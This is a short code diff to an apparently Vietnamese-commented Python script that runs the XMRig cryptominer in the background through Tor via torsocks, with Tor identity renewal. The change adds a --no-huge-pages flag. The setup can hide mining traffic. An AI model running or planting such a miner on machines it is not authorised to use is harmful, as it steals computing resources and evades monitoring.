@@ -92,7 +92,7 @@ def renew_connection():
         controller.authenticate()  # Không cần mật khẩu nếu không đặt HashedControlPassword
         controller.signal(Signal.NEWNYM)
 
-# Step 10: Chạy XMRig thông qua Tor proxy bằng torsocks
+# Step 10: Chạy XMRig thông qua Tor proxy bằng torsocks và thêm --no-huge-pages
 def run_xmrig_through_tor(xmrig_path):
     xmrig_cmd = [
         "torsocks",  # Sử dụng torsocks để bắt buộc kết nối qua Tor
@@ -101,6 +101,7 @@ def run_xmrig_through_tor(xmrig_path):
         "-o", POOL,
         "-u", USERNAME,
         "-a", ALGO,
+        "--no-huge-pages",  # Thêm tham số để vô hiệu hóa Huge Pages
         "-k", "--tls"
     ]
     return subprocess.Popen(xmrig_cmd)  # Chạy XMRig trong nền
